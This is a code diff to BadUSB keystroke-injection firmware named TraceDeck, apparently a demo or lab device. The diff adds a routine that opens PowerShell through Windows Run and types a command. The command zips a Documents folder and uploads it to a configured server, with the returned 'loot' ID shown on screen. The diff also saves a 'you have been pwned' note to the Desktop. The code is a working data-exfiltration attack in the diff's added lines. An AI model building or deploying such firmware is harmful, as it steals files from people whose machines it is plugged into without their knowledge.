@@ -6,19 +6,19 @@
 #define TRACEDECK_STRINGIFY(value) TRACEDECK_STRINGIFY_LITERAL(value)
 
 namespace{
-    // Delay for the Save As dialog to appear after pressing Ctrl+S in Notepad
+    // Delay for a file dialog (Save As / Select Folder) to open or navigate.
     constexpr uint32_t kDialogWaitMs = 1750;
-    // Delay for Notepad to launch after pressing Win+R and typing "notepad.exe"
+    // Delay for Notepad to launch after Win+R and typing "notepad.exe".
     constexpr uint32_t kNotepadLaunchWaitMs = 2500;
-    // Delay for the Save As dialog to appear after pressing Ctrl+S in Notepad
+    // Delay for Notepad to settle after the save completes.
     constexpr uint32_t kNotepadSaveWaitMs = 2500;
-    // Delay for the browser to launch after pressing Win+R and typing the upload URL
-    constexpr uint32_t kBrowserLaunchWaitMs = 2500;
-    // Delay for the Save As dialog to appear after pressing Ctrl+S in the browser
-    constexpr uint32_t kNotepadTotalWaitMs = kNotepadLaunchWaitMs + 4 * kDialogWaitMs;
-    // Delay for the Save As dialog to appear after pressing Ctrl+S in the browser
-    constexpr uint32_t kUploadTotalWaitMs = kNotepadSaveWaitMs + kBrowserLaunchWaitMs + 3 * kDialogWaitMs;
-    // Refresh the progress bar every 125ms, which is a good balance between responsiveness and not overwhelming the host with USB traffic.
+    // Delay for the visible PowerShell window to open.
+    constexpr uint32_t kPowerShellLaunchWaitMs = 2500;
+    constexpr uint32_t kShortcutHoldMs = 75;
+    // Total delays in each phase, for the progress bar.
+    constexpr uint32_t kNotepadTotalWaitMs = kNotepadLaunchWaitMs + 6 * kDialogWaitMs + kNotepadSaveWaitMs;
+    constexpr uint32_t kUploadTotalWaitMs = kPowerShellLaunchWaitMs + kDialogWaitMs;
+    // Refresh the progress bar every 125 ms.
     constexpr uint32_t kProgressRefreshMs = 125;
 
 #ifdef TRACEHUB_SERVER_IP
@@ -56,7 +56,9 @@ namespace{
     {
         Keyboard.press(modifier);
         Keyboard.press(key);
+        delay(kShortcutHoldMs);
         Keyboard.releaseAll();
+        delay(kShortcutHoldMs);
     }
 
     void openFromWindowsRun(const char *target, TimedProgress &timing)
@@ -70,14 +72,49 @@ namespace{
 
     void enterFilePathInDialog(TimedProgress &timing)
     {
-        pressShortcut(KEY_LEFT_ALT, 'd');
-        Keyboard.print("%TEMP%");
-        Keyboard.write(KEY_RETURN);
-        timing.wait(kDialogWaitMs);
-
+        // Give Save As a full filename so navigation focus cannot choose the location.
         pressShortcut(KEY_LEFT_ALT, 'n');
+        timing.wait(kDialogWaitMs);
         pressShortcut(KEY_LEFT_CTRL, 'a');
-        Keyboard.print("hello-world.txt");
+        Keyboard.print("%USERPROFILE%\\Desktop\\TinyCircuitDemo.txt");
+        Keyboard.write(KEY_RETURN);
+    }
+
+    void sendZipUploadCommand(TimedProgress &timing)
+    {
+        openFromWindowsRun("powershell.exe -NoProfile", timing);
+        timing.wait(kPowerShellLaunchWaitMs);
+        // Each attempt owns a fresh temporary directory. Keep its ZIP if upload fails.
+        Keyboard.print(
+            "$ErrorActionPreference='Stop'; "
+            "Add-Type -AssemblyName System.Net.Http; "
+            "Add-Type -AssemblyName System.IO.Compression.FileSystem; "
+            "$folder=Join-Path $env:USERPROFILE 'Documents\\Test_Important'; "
+            "$temporary=Join-Path $env:TEMP ('TraceDeck-'+[guid]::NewGuid()); "
+            "New-Item -ItemType Directory -Path $temporary | Out-Null; "
+            "$zip=Join-Path $temporary 'Test_Important.zip'; "
+            "$client=[System.Net.Http.HttpClient]::new(); "
+            "$client.Timeout=[TimeSpan]::FromSeconds(60); "
+            "$form=[System.Net.Http.MultipartFormDataContent]::new(); "
+            "try { "
+            "[IO.Compression.ZipFile]::CreateFromDirectory($folder,$zip,[IO.Compression.CompressionLevel]::Optimal,$true); "
+            "$form.Add([System.Net.Http.StringContent]::new([guid]::NewGuid().ToString()),'submission_id'); "
+            "$form.Add([System.Net.Http.ByteArrayContent]::new([IO.File]::ReadAllBytes($zip)),'file','Test_Important.zip'); "
+            "$client.DefaultRequestHeaders.Accept.ParseAdd('application/json'); "
+            "$response=$client.PostAsync('"
+        );
+        Keyboard.print(kTraceHubUploadUrl);
+        Keyboard.print(
+            "',$form).GetAwaiter().GetResult(); "
+            "$response.EnsureSuccessStatusCode() | Out-Null; "
+            "$saved=$response.Content.ReadAsStringAsync().GetAwaiter().GetResult() | ConvertFrom-Json; "
+            "$lootId=[guid]::Parse($saved.loot_id); "
+            "if($lootId -eq [guid]::Empty){throw 'Missing loot ID'}; "
+            "Remove-Item -LiteralPath $zip; Remove-Item -LiteralPath $temporary; "
+            "Write-Host ('Saved loot '+$lootId+'; temporary ZIP deleted') -ForegroundColor Green "
+            "} catch { Write-Host $_ -ForegroundColor Red; Write-Host ('ZIP retained if created: '+$zip) "
+            "} finally { $form.Dispose(); $client.Dispose() }"
+        );
         Keyboard.write(KEY_RETURN);
     }
 
@@ -89,11 +126,21 @@ namespace{
         // Start a new document in case Notepad restored an earlier tab.
         pressShortcut(KEY_LEFT_CTRL, 'n');
         timing.wait(kDialogWaitMs);
-        Keyboard.print("hello world");
-        pressShortcut(KEY_LEFT_CTRL, 's');
+        Keyboard.print("you have been pwned by TraceDeck");
+        timing.wait(kDialogWaitMs);
+
+        // Request Save As explicitly after the text has settled.
+        Keyboard.press(KEY_LEFT_CTRL);
+        Keyboard.press(KEY_LEFT_SHIFT);
+        Keyboard.press('s');
+        delay(kShortcutHoldMs);
+        Keyboard.releaseAll();
         timing.wait(kDialogWaitMs);
 
         enterFilePathInDialog(timing);
+        timing.wait(kNotepadSaveWaitMs);
+        pressShortcut(KEY_LEFT_ALT, KEY_F4);
+        timing.wait(kDialogWaitMs);
     }
 }
 
@@ -113,16 +160,10 @@ void sendDropUploadKeys(const BadUsbProgress &progress)
         return;
     }
 
-    // Let Save As finish before Windows Run takes focus again.
-    timing.wait(kNotepadSaveWaitMs);
     if (!USBDevice.configured())
     {
         return;
     }
 
-    openFromWindowsRun(kTraceHubUploadUrl, timing);
-    timing.wait(kBrowserLaunchWaitMs);
-    Keyboard.write(KEY_RETURN);
-    timing.wait(kDialogWaitMs);
-    enterFilePathInDialog(timing);
+    sendZipUploadCommand(timing);
 }
